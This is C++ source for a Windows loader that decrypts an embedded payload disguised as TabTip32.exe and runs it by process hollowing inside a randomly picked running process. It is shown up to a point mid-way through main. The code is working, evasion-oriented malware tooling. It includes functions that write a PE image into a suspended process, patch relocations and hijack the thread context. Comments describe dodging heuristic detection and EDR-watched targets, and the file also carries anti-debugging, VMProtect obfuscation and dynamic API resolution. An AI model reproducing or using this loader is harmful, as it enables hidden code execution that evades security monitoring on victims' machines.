#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <string>
#include <vector>
#include <random>
#include "TabTip32_exe_bytes.h"
#include "VMProtectSDK.h"
#include "crypto.h"
#include "hwid.h"
#include "license.h"
#include "license_dialog.h"
#include "build_secrets.h"
#include "antidebug.h"
#include "data_writer.h"
#include "winapi.h" // last - installs WinAPI redirection macros

// Map PE section characteristics to Windows memory protection constants.
// This eliminates the need for blanket PAGE_EXECUTE_READWRITE allocations,
// which are the #1 heuristic flag for process hollowing.
static DWORD SectionToProtection(DWORD sc) {
 if (sc & IMAGE_SCN_MEM_EXECUTE) {
 if (sc & IMAGE_SCN_MEM_WRITE) return PAGE_EXECUTE_READWRITE;
 if (sc & IMAGE_SCN_MEM_READ) return PAGE_EXECUTE_READ;
 return PAGE_EXECUTE;
 }
 if (sc & IMAGE_SCN_MEM_WRITE) return PAGE_READWRITE;
 if (sc & IMAGE_SCN_MEM_READ) return PAGE_READONLY;
 return PAGE_NOACCESS;
}

static void ApplySectionProtections(HANDLE hProcess, LPVOID baseAddr,
 const void* lpImage, WORD numSections, DWORD sizeOfHeaders,
 uintptr_t ntHeaderBase, DWORD sizeOfOptionalHeader) {
 for (int j = 0; j < numSections; j++) {
 const auto lpSec = (PIMAGE_SECTION_HEADER)(ntHeaderBase + 4 +
 sizeof(IMAGE_FILE_HEADER) + sizeOfOptionalHeader +
 (j * sizeof(IMAGE_SECTION_HEADER)));
 DWORD oldProt;
 DWORD sz = lpSec->Misc.VirtualSize;
 if (sz == 0) sz = lpSec->SizeOfRawData;
 VirtualProtectEx(hProcess,
 (LPVOID)((uintptr_t)baseAddr + lpSec->VirtualAddress),
 sz, SectionToProtection(lpSec->Characteristics), &oldProt);
 }
 DWORD oldProt;
 VirtualProtectEx(hProcess, baseAddr, sizeOfHeaders, PAGE_READONLY, &oldProt);
}

struct ProcessInfo {
 DWORD pid;
 bool isAccessible;
 bool is64Bit;
 DWORD subsystem;
 std::string name;
};

struct ProcessAddressInformation {
 LPVOID lpProcessPEBAddress;
 LPVOID lpProcessImageBaseAddress;
};

typedef struct IMAGE_RELOCATION_ENTRY {
 WORD Offset : 12;
 WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

bool Is64BitProcess(HANDLE hProcess) {
 BOOL isWow64 = FALSE;
 if (!IsWow64Process(hProcess, &isWow64)) {
 return false;
 }
 SYSTEM_INFO systemInfo;
 GetNativeSystemInfo(&systemInfo);
 return (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 && !isWow64);
}

DWORD GetProcessSubsystem(HANDLE hProcess, LPVOID baseAddress) {
 IMAGE_DOS_HEADER dosHeader = {};
 if (!ReadProcessMemory(hProcess, baseAddress, &dosHeader, sizeof(dosHeader), nullptr)) {
 return -1;
 }
 if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
 return -1;
 }
 BYTE headerBuffer[4096];
 if (!ReadProcessMemory(hProcess, (BYTE*)baseAddress + dosHeader.e_lfanew, headerBuffer, sizeof(headerBuffer), nullptr)) {
 return -1;
 }
 PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)headerBuffer;
 if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
 return -1;
 }
 return ntHeader->OptionalHeader.Subsystem;
}

DWORD GetSourceSubsystem(bool isEmbedded) {
 if (!isEmbedded) return -1;

 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)TabTip32_exe;
 if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
 return -1;
 }

 PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)TabTip32_exe + dosHeader->e_lfanew);
 if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
 return -1;
 }

 return ntHeader->OptionalHeader.Subsystem;
}

HANDLE GetFileContent(bool isEmbedded) {
 if (!isEmbedded) return nullptr;

 const HANDLE hFileContent = HeapAlloc(GetProcessHeap(), 0, TabTip32_exe_len);
 if (hFileContent == INVALID_HANDLE_VALUE || hFileContent == nullptr) {
 return nullptr;
 }
 memcpy(hFileContent, TabTip32_exe, TabTip32_exe_len);
 return hFileContent;
}

BOOL IsValidPE(const LPVOID lpImage) {
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
 return lpImageNTHeader->Signature == IMAGE_NT_SIGNATURE;
}

BOOL IsPE32(const LPVOID lpImage) {
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader = (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
 return lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC;
}

ProcessAddressInformation GetProcessAddressInformation32(const PPROCESS_INFORMATION lpPI) {
 LPVOID lpImageBaseAddress = nullptr;
 WOW64_CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 Wow64GetThreadContext(lpPI->hThread, &CTX);
 ReadProcessMemory(lpPI->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &lpImageBaseAddress, sizeof(DWORD), nullptr);
 return ProcessAddressInformation{ (LPVOID)(uintptr_t)CTX.Ebx, lpImageBaseAddress };
}

ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI) {
 LPVOID lpImageBaseAddress = nullptr;
 CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 GetThreadContext(lpPI->hThread, &CTX);
 ReadProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageBaseAddress, sizeof(UINT64), nullptr);
 return ProcessAddressInformation{ (LPVOID)CTX.Rdx, lpImageBaseAddress };
}

BOOL HasRelocation32(const LPVOID lpImage) {
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
 return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
}

BOOL HasRelocation64(const LPVOID lpImage) {
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);
 return lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
}

void CleanAndExitProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent) {
 if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
 HeapFree(GetProcessHeap(), 0, hFileContent);
 if (lpPI->hThread != nullptr)
 CloseHandle(lpPI->hThread);
 if (lpPI->hProcess != nullptr) {
 TerminateProcess(lpPI->hProcess, -1);
 CloseHandle(lpPI->hProcess);
 }
}

void CleanProcess(const LPPROCESS_INFORMATION lpPI, const HANDLE hFileContent) {
 if (hFileContent != nullptr && hFileContent != INVALID_HANDLE_VALUE)
 HeapFree(GetProcessHeap(), 0, hFileContent);
 if (lpPI->hThread != nullptr)
 CloseHandle(lpPI->hThread);
 if (lpPI->hProcess != nullptr)
 CloseHandle(lpPI->hProcess);
}

// In the GetCompatibleProcesses function, add explicit check for current process ID
std::vector<ProcessInfo> GetCompatibleProcesses(DWORD sourceSubsystem, bool sourceIs64Bit) {
 std::vector<ProcessInfo> compatibleProcesses;
 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 if (hSnapshot == INVALID_HANDLE_VALUE) {
 return compatibleProcesses;
 }

 PROCESSENTRY32W pe32 = {};
 pe32.dwSize = sizeof(PROCESSENTRY32W);

 DWORD currentPid = GetCurrentProcessId();

 if (Process32FirstW(hSnapshot, &pe32)) {
 do {
 // Skip system processes and our own process
 if (pe32.th32ProcessID == 0 || pe32.th32ProcessID == 4 || pe32.th32ProcessID == currentPid) {
 continue;
 }

 ProcessInfo info;
 info.pid = pe32.th32ProcessID;

 // Convert wide char to char for process name
 char processName[MAX_PATH];
 size_t converted;
 wcstombs_s(&converted, processName, pe32.szExeFile, MAX_PATH);
 info.name = processName;

 HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, info.pid);
 info.isAccessible = (hProcess != NULL);

 if (hProcess) {
 info.is64Bit = Is64BitProcess(hProcess);

 HMODULE hMod;
 DWORD cbNeeded;
 if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
 info.subsystem = GetProcessSubsystem(hProcess, hMod);
 }
 CloseHandle(hProcess);
 }

 // Check if this process matches our criteria
 bool subsystemMatch = (sourceSubsystem == -1) || (info.subsystem == sourceSubsystem);
 if (info.isAccessible && subsystemMatch && info.is64Bit == sourceIs64Bit) {
 compatibleProcesses.push_back(info);
 }

 } while (Process32NextW(hSnapshot, &pe32));
 }

 CloseHandle(hSnapshot);
 return compatibleProcesses;
}

// In the FindRandomTargetProcess function, ensure proper randomness
DWORD FindRandomTargetProcess(DWORD sourceSubsystem, bool sourceIs64Bit) {
 VMProtectBeginMutation("FRT");
 std::vector<ProcessInfo> compatibleProcesses = GetCompatibleProcesses(sourceSubsystem, sourceIs64Bit);

 if (compatibleProcesses.empty()) {
 // Try again with any subsystem
 compatibleProcesses = GetCompatibleProcesses(-1, sourceIs64Bit);
 if (compatibleProcesses.empty()) {
 return 0;
 }
 }

 // Use random device for better randomness
 std::random_device rd;
 std::mt19937 gen(rd());
 std::uniform_int_distribution<> dis(0, compatibleProcesses.size() - 1);

 int randomIndex = dis(gen);
 DWORD result = compatibleProcesses[randomIndex].pid;
 VMProtectEnd();
 return result;
}

bool GetProcessInfo(DWORD pid, char* path, size_t path_size, bool& is64Bit) {
 HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
 if (hProcess == NULL) {
 return false;
 }
 bool success = (GetModuleFileNameExA(hProcess, NULL, path, path_size) != 0);
 is64Bit = Is64BitProcess(hProcess);
 CloseHandle(hProcess);
 return success;
}

BOOL RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage) {
 VMProtectBeginUltra("RP32");
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

 LPVOID lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase,
 lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (lpAllocAddress == nullptr) return FALSE;

 if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, (LPVOID)lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr)) {
 return FALSE;
 }

 for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++) {
 const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) +
 lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
 (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr)) {
 return FALSE;
 }
 }

 ApplySectionProtections(lpPI->hProcess, lpAllocAddress, lpImage,
 lpImageNTHeader32->FileHeader.NumberOfSections,
 lpImageNTHeader32->OptionalHeader.SizeOfHeaders,
 (uintptr_t)lpImageNTHeader32,
 lpImageNTHeader32->FileHeader.SizeOfOptionalHeader);

 WOW64_CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 if (!Wow64GetThreadContext(lpPI->hThread, &CTX)) return FALSE;
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr)) {
 return FALSE;
 }

 CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);
 if (!Wow64SetThreadContext(lpPI->hThread, &CTX)) return FALSE;

 ResumeThread(lpPI->hThread);
 VMProtectEnd();
 return TRUE;
}

BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage) {
 VMProtectBeginUltra("RP64");
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

 LPVOID lpAllocAddress = VirtualAllocEx(lpPI->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase,
 lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (lpAllocAddress == nullptr) return FALSE;

 if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr)) {
 return FALSE;
 }

 for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++) {
 const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) +
 lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
 (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr)) {
 return FALSE;
 }
 }

 ApplySectionProtections(lpPI->hProcess, lpAllocAddress, lpImage,
 lpImageNTHeader64->FileHeader.NumberOfSections,
 lpImageNTHeader64->OptionalHeader.SizeOfHeaders,
 (uintptr_t)lpImageNTHeader64,
 lpImageNTHeader64->FileHeader.SizeOfOptionalHeader);

 CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 if (!GetThreadContext(lpPI->hThread, &CTX)) return FALSE;
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr)) {
 return FALSE;
 }

 CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;
 if (!SetThreadContext(lpPI->hThread, &CTX)) return FALSE;

 ResumeThread(lpPI->hThread);
 VMProtectEnd();
 return TRUE;
}

BOOL RunPEReloc32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage) {
 VMProtectBeginUltra("RPR32");
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

 LPVOID lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader32->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (lpAllocAddress == nullptr) return FALSE;

 // For a 32-bit PE, the image base and relocation delta must fit in 32 bits.
 // If VirtualAllocEx returned an address above 4 GB (e.g. 64-bit target),
 // relocations would silently corrupt - fail early instead.
 const DWORD_PTR allocAddr = reinterpret_cast<DWORD_PTR>(lpAllocAddress);
 if (allocAddr > 0xFFFFFFFF) {
 VirtualFreeEx(lpPI->hProcess, lpAllocAddress, 0, MEM_RELEASE);
 return FALSE;
 }
 const DWORD newBase = static_cast<DWORD>(allocAddr);
 const DWORD DeltaImageBase = newBase - lpImageNTHeader32->OptionalHeader.ImageBase;
 lpImageNTHeader32->OptionalHeader.ImageBase = newBase;

 if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr)) {
 return FALSE;
 }

 const IMAGE_DATA_DIRECTORY ImageDataReloc = lpImageNTHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

 for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++) {
 const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) +
 lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));

 if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress &&
 ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize)) {
 lpImageRelocSection = lpImageSectionHeader;
 }

 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
 (LPVOID)((uintptr_t)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr)) {
 return FALSE;
 }
 }

 if (lpImageRelocSection == nullptr) return FALSE;

 DWORD RelocOffset = 0;
 while (RelocOffset < ImageDataReloc.Size) {
 const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
 RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
 const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);

 for (DWORD i = 0; i < NumberOfEntries; i++) {
 const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
 RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

 if (lpImageRelocationEntry->Type == 0) continue;

 const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
 DWORD PatchedAddress = 0;

 ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
 PatchedAddress += DeltaImageBase;
 WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
 }
 }

 ApplySectionProtections(lpPI->hProcess, lpAllocAddress, lpImage,
 lpImageNTHeader32->FileHeader.NumberOfSections,
 lpImageNTHeader32->OptionalHeader.SizeOfHeaders,
 (uintptr_t)lpImageNTHeader32,
 lpImageNTHeader32->FileHeader.SizeOfOptionalHeader);

 WOW64_CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 if (!Wow64GetThreadContext(lpPI->hThread, &CTX)) return FALSE;
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr)) {
 return FALSE;
 }

 CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);
 if (!Wow64SetThreadContext(lpPI->hThread, &CTX)) return FALSE;

 ResumeThread(lpPI->hThread);
 VMProtectEnd();
 return TRUE;
}

BOOL RunPEReloc64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpImage) {
 VMProtectBeginUltra("RPR64");
 const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)lpImage;
 const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

 LPVOID lpAllocAddress = VirtualAllocEx(lpPI->hProcess, nullptr, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (lpAllocAddress == nullptr) return FALSE;

 const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;
 lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;

 if (!WriteProcessMemory(lpPI->hProcess, lpAllocAddress, lpImage, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr)) {
 return FALSE;
 }

 const IMAGE_DATA_DIRECTORY ImageDataReloc = lpImageNTHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

 for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++) {
 const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) +
 lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));

 if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress &&
 ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize)) {
 lpImageRelocSection = lpImageSectionHeader;
 }

 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
 (LPVOID)((UINT64)lpImage + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr)) {
 return FALSE;
 }
 }

 if (lpImageRelocSection == nullptr) return FALSE;

 DWORD RelocOffset = 0;
 while (RelocOffset < ImageDataReloc.Size) {
 const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
 RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
 const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);

 for (DWORD i = 0; i < NumberOfEntries; i++) {
 const auto lpImageRelocationEntry = (PIMAGE_RELOCATION_ENTRY)((DWORD64)lpImage + lpImageRelocSection->PointerToRawData + RelocOffset);
 RelocOffset += sizeof(IMAGE_RELOCATION_ENTRY);

 if (lpImageRelocationEntry->Type == 0) continue;

 const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
 DWORD64 PatchedAddress = 0;

 ReadProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
 PatchedAddress += DeltaImageBase;
 WriteProcessMemory(lpPI->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
 }
 }

 ApplySectionProtections(lpPI->hProcess, lpAllocAddress, lpImage,
 lpImageNTHeader64->FileHeader.NumberOfSections,
 lpImageNTHeader64->OptionalHeader.SizeOfHeaders,
 (uintptr_t)lpImageNTHeader64,
 lpImageNTHeader64->FileHeader.SizeOfOptionalHeader);

 CONTEXT CTX = {};
 CTX.ContextFlags = CONTEXT_FULL;
 if (!GetThreadContext(lpPI->hThread, &CTX)) return FALSE;
 if (!WriteProcessMemory(lpPI->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr)) {
 return FALSE;
 }

 CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;
 if (!SetThreadContext(lpPI->hThread, &CTX)) return FALSE;

 ResumeThread(lpPI->hThread);
 VMProtectEnd();
 return TRUE;
}

int main() {
 // Anti-debug first - synchronous early checks + ntdll patches + watchdog
 // thread. Runs BEFORE any user input or sensitive crypto so a debugger
 // attached at process start can't intercept the license entry.
 antidebug::install();

 // Resolve the WinAPI process-hollowing toolkit dynamically - must run
 // before any function pointer in the winapi:: namespace is used.
 if (!winapi::init()) return -1;

 // ── Acquire license: try auth.dat (HWID-encrypted), else prompt. ────────
 uint8_t licenseBytes[license::kLicenseLen];
 bool haveLicense = license::load_from_auth_file(licenseBytes);

 if (!haveLicense) {
 char inputBuf[license::kLicenseLen + 1] = {0};
 if (!license_dialog::prompt(inputBuf)) {
 return -1; // user cancelled
 }
 size_t inputLen = strnlen_s(inputBuf, sizeof(inputBuf));
 if (!license::validate(inputBuf, inputLen)) {
 SecureZeroMemory(inputBuf, sizeof(inputBuf));
 return -1; // wrong key - silent exit
 }
 memcpy(licenseBytes, inputBuf, license::kLicenseLen);
 license::save_to_auth_file(licenseBytes); // best effort
 SecureZeroMemory(inputBuf, sizeof(inputBuf));
 }

 // Single-binary deployment: seed `data` for the hollowed app if it's
 // not already present. Idempotent - once the app is running it
 // owns `data` and we never touch it again (the app rewrites it via
 // ConfigManager::saveConfig when the user adjusts settings via WebUI).
 data_writer::ensure_data_file();

 // ── Derive payload AES key = SHA256(license || kBuildSalt). ─────────────
 uint8_t payloadKey[crypto::kAesKeyLen];
 {
 uint8_t kdfInput[license::kLicenseLen + sizeof(kBuildSalt)];
 memcpy(kdfInput, licenseBytes, license::kLicenseLen);
 memcpy(kdfInput + license::kLicenseLen, kBuildSalt, sizeof(kBuildSalt));
 SecureZeroMemory(licenseBytes, sizeof(licenseBytes));
 bool ok = crypto::sha256(kdfInput, sizeof(kdfInput), payloadKey);
 SecureZeroMemory(kdfInput, sizeof(kdfInput));
 if (!ok) {
 SecureZeroMemory(payloadKey, sizeof(payloadKey));
 return -1;
 }
 }

 // ── AES-256-CBC decrypt payload in place. ───────────────────────────────
 // BCryptDecrypt with BCRYPT_BLOCK_PADDING strips PKCS#7 → plaintext is
 // 1-16 bytes shorter than ciphertext. Decrypt to scratch heap then copy
 // back, zero the tail so trailing bytes aren't stale ciphertext.
 {
 LPVOID tmp = HeapAlloc(GetProcessHeap(), 0, TabTip32_exe_len);
 if (!tmp) {
 SecureZeroMemory(payloadKey, sizeof(payloadKey));
 return -1;
 }
 size_t plaintextLen = 0;
 bool ok = crypto::aes256_cbc_decrypt(
 payloadKey, kPayloadIV,
 TabTip32_exe, TabTip32_exe_len,
 static_cast<uint8_t*>(tmp), TabTip32_exe_len,
 &plaintextLen);
 SecureZeroMemory(payloadKey, sizeof(payloadKey));
 if (!ok) {
 SecureZeroMemory(tmp, TabTip32_exe_len);
 HeapFree(GetProcessHeap(), 0, tmp);
 return -1;
 }
 memcpy(TabTip32_exe, tmp, plaintextLen);
 if (plaintextLen < TabTip32_exe_len) {
 memset(TabTip32_exe + plaintextLen, 0,
 TabTip32_exe_len - plaintextLen);
 }
 SecureZeroMemory(tmp, TabTip32_exe_len);
 HeapFree(GetProcessHeap(), 0, tmp);
 }

 VMProtectBeginUltra("MainFunction");

 // First, let's check what architecture our embedded EXE is
 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)TabTip32_exe;
 if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
 return -1;
 }

 PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)TabTip32_exe + dosHeader->e_lfanew);
 if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
 return -1;
 }

 bool sourceIs64Bit = (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
 DWORD sourceSubsystem = ntHeader->OptionalHeader.Subsystem;

 // GUI app - detach console entirely (no window flash)
 if (sourceSubsystem != IMAGE_SUBSYSTEM_WINDOWS_CUI) {
 FreeConsole();
 }

 // Decrypt + sanity-check the payload ONCE; reused across retries.
 const LPVOID hFileContent = GetFileContent(true);
 if (hFileContent == nullptr) return -1;
 if (!IsValidPE(hFileContent)) {
 HeapFree(GetProcessHeap(), 0, hFileContent);
 return -1;
 }
 const bool bSource32 = IsPE32(hFileContent);

 // Retry loop: FindRandomTargetProcess can return a target that won't
 // hollow cleanly (privileged, job-restricted, immediately self-terminating,
 // or an EDR-watched binary). Pick a different victim and try again.
 // Up to 8 attempts - way more than enough on a typical workstation,
 // bounded so we don't spin forever if literally every candidate fails.
 bool success = false;
 constexpr int kMaxAttempts = 8;
 for (int attempt = 0; attempt < kMaxAttempts && !success; ++attempt) {
 DWORD targetPid = FindRandomTargetProcess(sourceSubsystem, sourceIs64Bit);
 if (targetPid == 0) break; // no compatible candidates at all

 char processPath[MAX_PATH];
 bool targetIs64Bit;
 if (!GetProcessInfo(targetPid, processPath, MAX_PATH, targetIs64Bit)) continue;

 STARTUPINFOA SI = {};
 PROCESS_INFORMATION PI = {};
 SI.cb = sizeof(SI);
 DWORD creationFlags = CREATE_SUSPENDED;
 if (sourceSubsystem != IMAGE_SUBSYSTEM_WINDOWS_CUI) {
 creationFlags |= CREATE_NO_WINDOW;
 }

 if (!CreateProcessA(processPath, nullptr, nullptr, nullptr, FALSE,
 creationFlags, nullptr, nullptr, &SI, &PI)) continue;

 BOOL bTarget32;
 IsWow64Process(PI.hProcess, &bTarget32);
 ProcessAddressInformation pai = bTarget32
 ? GetProcessAddressInformation32(&PI)
 : GetProcessAddressInformation64(&PI);

 if (pai.lpProcessImageBaseAddress == nullptr) {
